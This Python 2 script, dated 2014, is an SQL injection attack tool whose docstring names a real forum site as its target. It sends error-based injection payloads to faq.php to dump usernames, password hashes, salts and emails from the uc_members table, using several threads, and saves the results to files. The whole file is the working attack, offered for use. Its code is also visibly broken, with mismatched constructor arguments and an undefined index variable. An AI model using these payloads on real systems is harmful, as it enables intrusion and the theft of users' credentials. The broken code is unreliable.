#!/usr/bin/env python
#encoding=utf-8

'''
function: for http://www.htcbbs.net/ to get the username and password and salt
author:jaffer
time:2014/7/6
'''
import httplib2
import urllib2
import urllib
import socket
from urllib import urlopen
from string import replace,find,lower
from httplib import HTTPException
import threading
import sys 
 
reload(sys)   

class getInfo(object):
    def __init__(self,fp,host):
        self.sql1 = 'action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%280x5E,username,0x3a,password,0x3a,salt%29%20from%20uc_members%20limit%20'+str(index)+',1%29,floor%28rand%280%29*2%29,0x5E%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
        self.sql2 = 'action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%280x5E,email%29%20from%20uc_members%20limit%20'+str(index)+',1%29,floor%28rand%280%29*2%29,0x5E%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
        self.host = host
        self.fp = fp
    def send(self):
        try:
            h = httplib2.Http()
            res1,con1 = h.request('http://'+self.host+'/faq.php?'+self.sql1,'GET')
            res2,con2 = h.request('http://'+self.host+'/faq.php?'+self.sql2,'GET')
            first = con1.find('^')
            second = con1.find('^',first+1,-1)
            name_pass_salt = con1[first+1:second-1]
            first = con2.find('^')
            second = con2.find('^',first+1,-1)
            email = con2[first+1:second-1]
            self.fp.write(name_pass_salt+':'+email+'\n')
            print name_pass_salt+':'+email
        except:
            pass
        
        
      #  return 0

class MyThread(threading.Thread):  
    def __init__(self,start_index,plen,host):  
        threading.Thread.__init__(self)
        self.start_index = int(start_index)
        self.plen = int(plen)
        self.host = host
          
    def run(self):  
        i= self.start_index
        name = self.start_index
        fp = open('wenliang'+str(name)+'.txt','ab+')
        j = 0
        while(j < self.plen):     
            ob = getInfo(fp,i,self.host)
            ob.send()
            i = i + 1
            j = j + 1
        fp.close()
            

       
def main():
    host = raw_input('input the host:(something like:www.wenliangjz.com/bbs):\n')
    start_index = raw_input('input the start:')
    end_index = raw_input('input the end:')
    thread_num = raw_input('thread number:')
    threads = []
    length = int(end_index)-int(start_index)
    plength = length/int(thread_num)
    left = length%int(thread_num)
    for i in range(0,int(thread_num)):
        thr = MyThread(int(start_index)+i*plength,plength)
        threads.append(thr)
    if left > 0:
        thr = MyThread(int(start_index)+i*plength,left)
        threads.append(thr)
        for i in range(0,int(thread_num)+1):
            threads[i].start()
        for i in range(0,int(thread_num)+1):
            threads[i].join()
    else:
        for i in range(0,int(thread_num)):
            threads[i].start()
        for i in range(0,int(thread_num)):
            threads[i].join()
    print 'ok'
 
    
if __name__ == '__main__': 
    main()
        
    
        

        